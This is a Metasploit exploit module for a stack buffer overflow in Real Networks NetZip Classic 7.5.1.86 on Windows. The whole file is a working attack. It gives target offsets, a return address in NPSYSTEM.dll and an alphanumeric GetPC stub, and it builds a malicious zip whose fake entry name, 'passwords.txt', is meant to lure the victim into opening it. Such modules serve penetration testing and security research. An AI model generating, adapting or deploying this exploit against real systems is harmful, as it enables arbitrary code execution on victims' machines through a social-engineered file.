# $Id: real_networks_netzip_bof.rb 13952 2011-10-16 15:47:04Z todb $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
require &#039;rex/zip&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Real Networks Netzip Classic 7.5.1 86 File Parsing Buffer Overflow Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow vulnerability in
                version 7.5.1 86 of Real Networks Netzip Classic.
                In order for the command to be executed, an attacker must convince someone to
                load a specially crafted zip file with NetZip Classic.
                By doing so, an attacker can execute arbitrary code as the victim user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;C4SS!0 G0M3S&#039;, # Vulnerability discovery and original exploit
                    &#039;TecR0c <roccogiovannicalvi[at]gmail.com>&#039;, # Metasploit module
                ],
            &#039;Version&#039;        => &#039;$Revision: 13952 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;BID&#039;, &#039;46059&#039; ],
                    [ &#039;URL&#039;, &#039;http://proforma.real.com&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/16083/&#039; ],
                ],
            &#039;Platform&#039;          => [ &#039;win&#039; ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039;         => 1000,
                    &#039;BadChars&#039;      => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),
                    &#039;DisableNops&#039;   => true,
                    &#039;EncoderOptions&#039; =>
                        {
                            &#039;BufferRegister&#039; => &#039;ESI&#039;
                        }
                },
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP3&#039;,
                        {
                            &#039;Offset&#039; => 247,        # To EIP
                            &#039;Ret&#039;    => 0x10061cf9, # PUSH ESP # RETN 08 - NPSYSTEM.dll 7.5.1.86
                            &#039;Max&#039;    => 2000,       # Max buffer size
                        }
                    ],
 
                    [
                        &#039;Windows 7/Windows Vista&#039;,
                        {
                            &#039;Offset&#039; => 248,        # To EIP
                            &#039;Ret&#039;    => 0x10061cf9, # PUSH ESP # RETN 08 - NPSYSTEM.dll 7.5.1.86
                            &#039;Max&#039;    => 2000,       # Max buffer size
                        }
                    ],
                ],
            &#039;DisclosureDate&#039; => &#039;Jan 30 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The output file name.&#039;, &#039;msf.zip&#039;]),
                OptString.new(&#039;CONTENTNAME&#039;, [ true, &#039;Name of the fake zipped file&#039;, &#039;passwords.txt&#039;]),
            ], self.class)
 
    end
 
    def exploit
 
        buffer = "#{datastore[&#039;CONTENTNAME&#039;]}"
        buffer << &#039; &#039; * (target[&#039;Offset&#039;]-buffer.length)
        buffer << [target.ret].pack(&#039;V&#039;)
        buffer << make_nops(8)
 
        # GetPC - Non ascii characters get converted
        buffer << "\x89\x05"   #jmp short (5 bytes) to &#039;jmp back&#039; at end
        buffer << "\x5e"       #pop esi
        buffer << "\x41"       #nop (inc ecx)
        buffer << "\x98\x99"   #call esi
        buffer << "\x41"       #nop (inc ecx)
        buffer << "\x8a\x94\x98\x98\x98"  #jmp back to pop esi
        buffer << payload.encoded
        buffer << rand_text_alpha(target[&#039;Max&#039;]-buffer.length)
 
        zip = Rex::Zip::Archive.new
        xtra = [0xdac0ffee].pack(&#039;V&#039;)
        comment = [0xbadc0ded].pack(&#039;V&#039;)
        zip.add_file(buffer, xtra, comment)
 
        # Create the file
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file...")
 
        file_create(zip.pack)
    end
 
end



